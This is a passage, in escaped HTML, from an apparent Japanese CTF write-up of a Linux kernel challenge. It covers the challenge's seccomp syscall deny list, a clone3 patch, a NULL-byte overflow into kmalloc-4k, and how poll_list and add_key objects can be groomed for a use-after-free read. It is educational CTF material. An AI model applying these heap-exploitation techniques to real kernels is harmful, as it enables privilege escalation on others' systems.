&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;args&amp;#34;&lt;/span>: [ { &lt;span style="color:#f92672">&amp;#34;index&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">2114060288&lt;/span>, &lt;span style="color:#f92672">&amp;#34;op&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;SCMP_CMP_MASKED_EQ&amp;#34;&lt;/span> } ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>許可されていないsyscallは、おおよそ以下のとおりです(雑に比較したので多少ずれはあるかも):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-disallowed.txt" data-lang="disallowed.txt">&lt;span style="display:flex;">&lt;span>msgget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msgsnd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msgrcv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msgctl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ptrace
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syslog
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uselib
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>personality
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ustat
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sysfs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vhangup
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pivot_root
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_sysctl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chroot
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>acct
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>settimeofday
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mount
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>umount2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>swapon
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>swapoff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reboot
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sethostname
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>setdomainname
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iopl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ioperm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>create_module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>init_module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>delete_module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>get_kernel_syms
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>query_module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>quotactl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nfsservctl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>getpmsg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>putpmsg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>afs_syscall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tuxcall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>security
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lookup_dcookie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>clock_settime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>vserver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mbind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set_mempolicy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>get_mempolicy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mq_open
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mq_unlink
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mq_timedsend
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mq_timedreceive
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mq_notify
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mq_getsetattr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kexec_load
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>request_key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>migrate_pages
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>unshare
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>move_pages
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>perf_event_open
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fanotify_init
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>name_to_handle_at
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>open_by_handle_at
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>setns
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>process_vm_readv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>process_vm_writev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kcmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>finit_module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>kexec_file_load
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bpf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>userfaultfd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pkey_mprotect
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pkey_alloc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pkey_free
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>unshare, mount, msgget, msgsnd, userfaultfd, bpf&lt;/code>らへんが禁止されていますね。&lt;/p>
&lt;p>ちなみに、Ubuntu22.04環境でpthreadを含めてstatic buildしたバイナリをコンテナ上で動かそうとしたところ、&lt;code>Operation not permitted&lt;/code>になりました。&lt;a href="https://blog.jp.square-enix.com/iteng-blog/posts/00016-wsl2-gui-seccomp-issue/">Dockerには多分seccompでひっかかったsyscallのレポート機能がない&lt;/a>ため、手動と勘で問題になっているsyscallを探したところ、&lt;code>clone3&lt;/code> syscallが問題になっているようでした。よって、&lt;code>seccomp.json&lt;/code>に以下のようなパッチを当てました(writeupを見た感じ、pthreadの使用は意図しているため、pthreadを含む環境の違いっぽい?):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-seccomp.patch" data-lang="seccomp.patch">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">--- a/../build/coros/files/docker/seccomp.json
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/./seccomp.json
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -10,6 +10,10 @@
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &amp;#34;names&amp;#34;: [ &amp;#34;clone&amp;#34; ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;action&amp;#34;: &amp;#34;SCMP_ACT_ALLOW&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;args&amp;#34;: [ { &amp;#34;index&amp;#34;: 0, &amp;#34;value&amp;#34;: 2114060288, &amp;#34;op&amp;#34;: &amp;#34;SCMP_CMP_MASKED_EQ&amp;#34; } ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ },
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ &amp;#34;names&amp;#34;: [ &amp;#34;clone3&amp;#34; ],
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">+ &amp;#34;action&amp;#34;: &amp;#34;SCMP_ACT_ALLOW&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="vuln-null-byte-overflow">Vuln: NULL-byte overflow&lt;/h2>
&lt;p>バグはGhidraのデコンパイル結果を見ると明らかです。
&lt;code>common_proc_write()&lt;/code>ではユーザから渡されたsyscallの文字列を&lt;code>heap&lt;/code>(kmalloc-4k)にコピーしています。その後、&lt;code>heap&lt;/code>の最後をNULL終端しようとしていますが、&lt;code>size&lt;/code>が&lt;code>0x1000&lt;/code>の時にNULL-byte overflowするようになっています:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-.c" data-lang=".c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">common_proc_write&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> size) sz &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xFFF&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">copy_from_user&lt;/span>(heap, ubuf, sz) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {...}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> heap[sz] &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使われるスラブキャッシュは&lt;code>kmalloc-4k&lt;/code>です。&lt;a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">コレ&lt;/a>とかを見ると、まぁ使えそうな構造体はあるように思えますが、今回はseccompでフィルターされているため1K以上のキャッシュで使える構造体はこのリストには見当たりません。最近のkernelpwn追ってないしここでお手上げに成ったので、writeupをカンニングしました、チート最高！&lt;/p>
&lt;h2 id="pre-requisites">pre-requisites&lt;/h2>
&lt;h3 id="sys_poll">&lt;code>sys_poll&lt;/code>&lt;/h3>
&lt;p>&lt;code>sys_poll()&lt;/code>が使えるらしい。ソースはこんな感じ(余計なところは省略している):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fs/select/select.c" data-lang="fs/select/select.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define FRONTEND_STACK_ALLOC 256
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define POLL_STACK_ALLOC FRONTEND_STACK_ALLOC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list)) / \
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> sizeof(struct pollfd))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define POLLFD_PER_PAGE ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">struct&lt;/span> pollfd {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> fd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">short&lt;/span> events;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">short&lt;/span> revents;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}; &lt;span style="color:#75715e">/* size: 8, cachelines: 1, members: 3 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> poll_list {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> poll_list &lt;span style="color:#f92672">*&lt;/span>next;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> pollfd entries[];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}; &lt;span style="color:#75715e">/* size: 16, cachelines: 1, members: 3 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">do_sys_poll&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pollfd __user &lt;span style="color:#f92672">*&lt;/span>ufds, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> nfds,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> timespec64 &lt;span style="color:#f92672">*&lt;/span>end_time)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> poll_wqueues table;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> stack_pps[POLL_STACK_ALLOC&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> poll_list &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> head &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> poll_list &lt;span style="color:#f92672">*&lt;/span>)stack_pps;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> poll_list &lt;span style="color:#f92672">*&lt;/span>walk &lt;span style="color:#f92672">=&lt;/span> head;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">min_t&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>, nfds, N_STACK_PPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (;;) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len &lt;span style="color:#f92672">=&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>len)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">copy_from_user&lt;/span>(walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>entries, ufds &lt;span style="color:#f92672">+&lt;/span> nfds&lt;span style="color:#f92672">-&lt;/span>todo,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pollfd) &lt;span style="color:#f92672">*&lt;/span> walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> out_fds;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> todo &lt;span style="color:#f92672">-=&lt;/span> walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>todo)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">min&lt;/span>(todo, POLLFD_PER_PAGE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> walk &lt;span style="color:#f92672">=&lt;/span> walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">kmalloc&lt;/span>(&lt;span style="color:#a6e22e">struct_size&lt;/span>(walk, entries, len),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GFP_KERNEL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>walk) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>ENOMEM;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> out_fds;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fdcount &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">do_poll&lt;/span>(head, &lt;span style="color:#f92672">&amp;amp;&lt;/span>table, end_time);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> err &lt;span style="color:#f92672">=&lt;/span> fdcount;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>out_fds:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> walk &lt;span style="color:#f92672">=&lt;/span> head&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (walk) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> poll_list &lt;span style="color:#f92672">*&lt;/span>pos &lt;span style="color:#f92672">=&lt;/span> walk;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> walk &lt;span style="color:#f92672">=&lt;/span> walk&lt;span style="color:#f92672">-&amp;gt;&lt;/span>next;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">kfree&lt;/span>(pos);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> err;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>まずユーザランドから渡された&lt;code>pollfd&lt;/code>リストをスタック上の&lt;code>stack_pps&lt;/code>に最大256byte分コピーします。厳密には、&lt;code>next, len&lt;/code>メンバ分の16byteを除いた240byte分(つまり&lt;code>struct pollfd&lt;/code>の30個分)をスタック上にコピーします。もしそれ以上の&lt;code>ufds&lt;/code>が渡された場合には、次は最大で&lt;code>POLLFD_PER_PAGE ((4096-16)/8 == 510)&lt;/code>個数分だけ&lt;code>kmalloc()&lt;/code>してコピーします。つまり、使われるスラブキャッシュはkmalloc-32 ~ kmalloc-4kのどれか(&lt;code>next, len&lt;/code>の分があるためkmalloc-16以下には入らない)です。こうして、256byteのstackと、32~4Kのheapに&lt;code>struct poll_list&lt;/code>と&lt;code>pollfd&lt;/code>をコピーしたあと、それらを&lt;code>next&lt;/code>ポインタで繋いでリストを作っています。freeは、リストの先頭から順に&lt;code>kfree&lt;/code>で単純に解放してます。
なるほど、たしかにこの構造体はkmalloc-32~4kの任意のサイズのキャッシュへのポインタを持つことができて、且つfreeはタイマーでも任意のタイミングでもできるため便利そう。
前述のNULL-byte overflowを使って&lt;code>struct pollfd&lt;/code>の&lt;code>next&lt;/code>をpartial overwriteすることで、そのスラブに入っているオブジェクトをUAF(read)できそうです。問題は、&lt;code>msgXXX&lt;/code>系のsyscallがフィルターされている状況で、どの構造体を使ってreadするか。&lt;/p>
&lt;h3 id="add_key--keyctl-syscall">&lt;code>add_key&lt;/code> / &lt;code>keyctl&lt;/code> syscall&lt;/h3>
&lt;p>まぁ勿論カンニングしたんですが。&lt;code>add_key&lt;/code>というシステムコールがあるらしい。知らんがな。そういえば、seccompのフィルターを見ると&lt;a href="https://docs.docker.com/engine/security/seccomp/">デフォルトの設定&lt;/a>では許可されていないのにこの問題では許可されています。ソースはこんな感じ:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fs/select.c" data-lang="fs/select.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// security/keys/user_defined.c
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">struct&lt;/span> key_type key_type_user &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;user&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .preparse &lt;span style="color:#f92672">=&lt;/span> user_preparse,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .free_preparse &lt;span style="color:#f92672">=&lt;/span> user_free_preparse,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .instantiate &lt;span style="color:#f92672">=&lt;/span> generic_key_instantiate,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .update &lt;span style="color:#f92672">=&lt;/span> user_update,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .revoke &lt;span style="color:#f92672">=&lt;/span> user_revoke,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .destroy &lt;span style="color:#f92672">=&lt;/span> user_destroy,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .describe &lt;span style="color:#f92672">=&lt;/span> user_describe,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .read &lt;span style="color:#f92672">=&lt;/span> user_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">user_preparse&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> key_preparsed_payload &lt;span style="color:#f92672">*&lt;/span>prep)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> user_key_payload &lt;span style="color:#f92672">*&lt;/span>upayload;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">size_t&lt;/span> datalen &lt;span style="color:#f92672">=&lt;/span> prep&lt;span style="color:#f92672">-&amp;gt;&lt;/span>datalen;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (datalen &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> datalen &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32767&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>prep&lt;span style="color:#f92672">-&amp;gt;&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>EINVAL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> upayload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">kmalloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>upayload) &lt;span style="color:#f92672">+&lt;/span> datalen, GFP_KERNEL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// security/keys/keyctl.c
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">SYSCALL_DEFINE5&lt;/span>(add_key, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>, _type,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>, _description, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> __user &lt;span style="color:#f92672">*&lt;/span>, _payload,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">size_t&lt;/span>, plen, &lt;span style="color:#66d9ef">key_serial_t&lt;/span>, ringid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">key_ref_t&lt;/span> keyring_ref, key_ref;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> type[&lt;span style="color:#ae81ff">32&lt;/span>], &lt;span style="color:#f92672">*&lt;/span>description;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>payload;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* draw all the data into kernel space */&lt;/span>
